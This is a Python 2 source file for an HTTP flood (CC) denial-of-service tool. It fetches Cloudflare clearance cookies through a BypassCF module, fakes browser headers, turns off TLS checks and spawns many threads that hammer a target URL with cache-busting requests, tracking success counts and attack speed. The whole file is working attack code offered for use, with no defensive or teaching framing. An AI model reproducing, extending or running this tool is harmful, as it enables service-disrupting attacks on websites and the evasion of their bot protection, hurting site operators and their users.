#coding:utf-8

import pycurl
import BypassCF
import threading
import StringIO
import time
success = failed = ready = speed = usedtime = 0
status = 'STOP'
stime = 0

def HTTP_GET(url,headers,keywords,charset='utf-8'):
    try:
        return_headers = StringIO.StringIO()
        return_body = StringIO.StringIO()

        private_headers = []

        for key in headers.keys():
            head = key + ': ' + headers[key]
            private_headers.append(head)

        c = pycurl.Curl()
        c.setopt(pycurl.URL, url)
        c.setopt(pycurl.SSL_VERIFYPEER, 0)
        c.setopt(pycurl.SSL_VERIFYHOST, 0)
        c.setopt(pycurl.HEADER, True)
        c.setopt(pycurl.HTTPHEADER, private_headers)
        c.setopt(pycurl.CONNECTTIMEOUT, 3)
        c.setopt(pycurl.FOLLOWLOCATION, False)
        c.setopt(pycurl.HEADERFUNCTION, return_headers.write)
        c.setopt(pycurl.WRITEFUNCTION, return_body.write)
        c.perform()

        return_headers = return_headers.getvalue()
        return_body = return_body.getvalue().decode(charset, 'ignore')

        if return_body.find(keywords) > -1 or return_headers.find(keywords) > -1:
            return True
        else:
            #print return_body
            return False
    except Exception as e:
        #print "error:",e
        return False

def getHeaders(url,is_protected_by_cf):
    global ready
    if is_protected_by_cf == True:
        data = BypassCF.get(url)

        if data == False:
            return data
        else:
            print 'ready!'
            ready += 1
        return {
            "Cookie":'__cfduid=%s;cf_clearance=%s;' % (data['cfduid'],data['cf_clearance']),
            'User-Agent':data['UA'],
            'Cache-Control':'no-cache',
            'Connection':'close',
            'Pragma':'no-cache',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
        }
    else:
        return {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36",
            'Cache-Control': 'no-cache',
            'Connection': 'close',
            'Pragma': 'no-cache',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
        }
class CCAttack(threading.Thread):

    def __init__(self, url,counter,headers,keywords,charset,path):
        threading.Thread.__init__(self)
        self.counter = counter
        self.url = url+path+"&ccid="+str(counter)
        self.headers = headers
        self.keywords = keywords
        self.charset = charset

    def run(self):
        global success, failed , speed , usedtime

        if HTTP_GET(self.url,self.headers,self.keywords,self.charset) == True:
            success += 1
        else:
            failed += 1

        if success % 100 == 0:
            print "success:%s\tfailed:%s\tready:%s\n" % (success, failed,ready)

        usedtime = time.time() - stime
        speed = int(success / usedtime)


class GO(threading.Thread):
    def __init__(self, url,keywords,charset,is_protected_by_cf,path,threadCount,peerCount):
        print url,keywords,charset,is_protected_by_cf,path,threadCount,peerCount
        threading.Thread.__init__(self)
        self.keywords = keywords
        self.charset = charset
        self.is_protected_by_cf = is_protected_by_cf
        self.path = path
        self.url = url
        self.threadCount = threadCount
        self.peerCount = peerCount
    def run(self):
        headers = getHeaders(self.url,self.is_protected_by_cf)
        if headers != False:
            for i in range(self.peerCount):
                thread = CCAttack(
                    self.url,
                    i,
                    headers,
                    self.keywords,
                    self.charset,
                    self.path
                )
                thread.start()
                while True:
                    if len(threading.enumerate()) <= self.threadCount:
                        break

def goAttack(T,url,path,charset,is_protected_by_cf,threadCount,peerCount,keywords):
    global status,success,failed,ready,stime,usedtime,speed
    stime = time.time()
    status = 'RUNING'
    success = failed = ready = speed = usedtime = 0
    print "Starting"
    threads = []

    for i in range(T):
        t1 = GO(url=url,charset=charset,is_protected_by_cf=is_protected_by_cf,path=path,threadCount=threadCount,peerCount=peerCount,keywords=keywords)
        threads.append(t1)
        t1.start()
    for thread in threads:
        thread.join()

    status = 'STOP'
    print "STOP"
    success = failed = ready = speed = usedtime = 0

def getstatus():
    return {
        'Satus':status,
        'Success':success,
        'Failed':failed,
        'Speed':speed,
        'Attacker':ready,
        'UsedTime':usedtime
    }